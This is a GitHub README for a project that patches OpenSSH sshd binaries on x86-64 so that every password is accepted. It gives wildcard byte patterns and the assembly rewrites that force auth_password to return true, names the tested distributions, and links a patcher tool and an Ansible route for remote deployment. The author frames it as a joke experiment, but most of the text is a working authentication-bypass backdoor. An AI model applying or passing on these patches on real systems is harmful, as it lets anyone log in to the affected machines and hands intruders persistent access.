# Drunk SSHd
> :warning: This project was an experiment purely for fun and should be treated as such. Do NOT put in production!

Ever wondered what happens if SSHd has a little too much to drink? Well, it starts accepting any password as valid. This repo contains generic byte replace patterns that will patch any `sshd` binary to accept any password as valid.

## Notes
Although the patterns are as generic as possible, they are only for x86-64 and may not work on all OpenSSH versions. Tested versions are as follows:
- Lubuntu 19.10
- Kali 2019.4
- Linux Mint 19.3 XFCE

The binaries can be found in [samples](samples)

## Easy Patching
## Remote
Please refer to the [Ansible](ANSIBLE.md) doc.
## Local
Use my [byte pattern patcher](https://github.com/ViRb3/byte-pattern-patcher) with [this patch file](patch-drunk-sshd.json) and target your `sshd` binary. You should see `three` replaced occurances, `one` for each pattern.

## Methodology
The patterns will patch all exit routines in `auth-passwd.c`'s
```c
int auth_password(struct ssh *ssh, const char *password)
```

to return true, therefore authenticated.

## Patterns
- Patch auth_password exit routine 1
```
31 ?? 85 ?? 0f 95 ?? 21 ??
31 ?? ?? ?? b8 01 00 00 00

31 [11......] 	// XOR
85 [11......] 	// TEST
0f 95 [11......] 	// SETNZ -> MOV EAX, 0x1
21 [11......] 	// AND -> OVERWRITTEN
```

- Patch auth_password exit routine 2
  - 2 variations (check patch file)
```
21 ?? 0f b6 ?? eb ??
b8 01 00 00 00 ?? ??

21 [11......] 	// AND -> MOV EAX, 0x1
0f b6 [11......] 	// MOVZX -> OVERWRITTEN
eb [........] 	// JMP
```

- Patch auth_password exit routine 3
  - 2 variations (check patch file)
```
85 ?? 0f 95 ?? 83 3d ?? ?? ?? ?? 01 74 ?? 8B ?? ?? ?? ?? ?? 85 ??
85 ?? 0f 95 ?? 83 3d ?? ?? ?? ?? 01 74 ?? 8B ?? ?? ?? ?? ?? 39 ??

85 [11......] 	// TEST
0f 95 [11......] 	// SETNZ
83 3d [........] [........] [........] [........] 01 	// CMP
74 [........] 	// JZ
8b [00...101] [........] [........] [........] [........] 	// MOV
85 [11......] 	// TEST -> CMP
```